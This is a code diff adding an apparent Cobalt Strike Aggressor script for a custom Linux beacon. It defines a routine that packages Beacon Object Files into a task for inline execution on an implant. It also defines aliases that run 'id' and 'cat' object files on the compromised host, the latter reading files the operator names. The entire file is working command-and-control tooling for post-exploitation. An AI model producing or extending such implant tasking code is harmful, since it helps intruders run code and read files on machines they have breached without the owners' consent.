@@ -1,0 +1,65 @@
+import beacon.CommandBuilder;
+import common.CommonUtils;
+
+sub beacon_inline_execute_linux {
+
+	btask($1, "Tasked beacon to inline execute Linux BOF!", "");
+
+	$bid = $1;
+	$rawBofBytes = $2;
+	$args = $3;
+
+	if($rawBofBytes eq $null)
+	{
+		berror($1, "Error: Specified BOF could not be found. Please ensure the file exists!");
+		return;
+	}
+
+	# https://github.com/WKL-Sec/HiddenDesktop/blob/14252f58e3f5379301f0d6334f92f8b96f321a16/bin/HiddenDesktop.cna#L80
+
+	$build = [ new CommandBuilder ];
+	[$build setCommand: 200];
+	[$build addLengthAndString: $rawBofBytes];
+	[$build addLengthAndString: $args];
+
+	call( "beacons.task", $null, $1, cast( [$build build], 'b' ) );
+}
+
+# If your BOF's Aggressor Script is in a separate Aggressor Script and not in here, you must add this include into it.
+###### include("/path/to/CobaltStrike-Linux-Beacon/CustomBeacon.cna"); ######
+
+alias linux_id {
+
+	$handle = openf(script_resource("id.x64.o"));
+	$rawBytesLength = lof(script_resource("id.x64.o"));
+	$rawBofBytes = readb($handle, -1);
+	closef($handle);
+	
+	if($rawBytesLength < 1)
+	{
+		berror($1,"Error: Specified BOF could not be found. Please ensure the file exists!");
+		return;
+	}
+
+    $args = "";
+
+	beacon_inline_execute_linux($1, $rawBofBytes, $args);
+}
+
+alias linux_cat {
+
+	$handle = openf(script_resource("cat.x64.o"));
+	$rawBytesLength = lof(script_resource("cat.x64.o"));
+	$rawBofBytes = readb($handle, -1);
+	closef($handle);
+	
+	if($rawBytesLength < 1)
+	{
+		berror($1,"Error: Specified BOF could not be found. Please ensure the file exists!");
+		return;
+	}
+
+	$args = bof_pack($1, "z", $2);
+
+	beacon_inline_execute_linux($1, $rawBofBytes, $args);
+}
